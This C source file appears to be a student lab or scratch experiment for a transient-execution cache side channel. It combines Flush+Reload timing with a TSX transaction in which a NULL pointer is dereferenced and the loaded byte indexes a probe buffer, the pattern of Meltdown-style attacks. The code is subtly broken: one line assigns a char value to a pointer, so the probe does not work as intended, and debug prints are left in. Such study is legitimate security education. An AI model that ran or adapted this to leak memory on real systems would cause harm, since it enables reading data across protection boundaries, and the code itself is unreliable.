#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <immintrin.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <x86intrin.h>

typedef struct Array {
    char data[0x1000];
} Array;


// used for flush-reload
volatile Array *buffer;


void
flush_all() {
    for (int i=0; i<256; i++) {
        _mm_clflush(&buffer[i].data[0]);
    }
    _mm_mfence();
}

uint64_t
reload_fastest(uint64_t *p_timing) {
    uint64_t min_timing = -1ul;
    uint64_t min_idx;
    // TODO: return minimum timing index and timing (via p_timing)
    // while reloading blocks from scratchpad

    uint64_t diff;
    uint64_t start;
    uint64_t end;
    volatile char c;
    uint32_t a;

    for (int i = 0; i < 256; i++) {
        start = __rdtscp(&a);
        c = buffer[i].data[0];
        end = __rdtscp(&a);
        diff = end - start;
        if (diff < min_timing) {
            min_timing = diff;
            min_idx = i;
        }
    }
    *p_timing = min_timing;
    return min_idx;
}

void *
mmap_size(size_t size) {
    return mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
            -1, 0);
}

int main() {
	buffer = mmap_size(sizeof(Array)*256);
	char* nullptr = NULL;
	
	while (1) {
		int status;
		if ((status = _xbegin()) == _XBEGIN_STARTED) {
			flush_all();
    			_mm_mfence();
			char value = *nullptr;
			char *entry_ptr =  buffer[value].data[0];
			volatile char ex = *entry_ptr;	
			_xend();
		} else {
    			uint32_t a;
    			volatile char c;
    			uint64_t diff;
    			uint64_t start;
    			uint64_t end;
        		start = __rdtscp(&a);
        		c = buffer[97].data[0];
        		end = __rdtscp(&a);
        		diff = end - start;
        		if (diff < 100) {
				printf("a: %d\n", diff);
			}
        		start = __rdtscp(&a);
        		c = buffer[8].data[0];
        		end = __rdtscp(&a);
        		diff = end - start;
        		if (diff < 100) {
				printf("8: %d\n", diff);
			} else {
				printf("hihihihihi\n\n\n\n\nhihihi\n\n");
			}
		}
	}
	return 0;
}
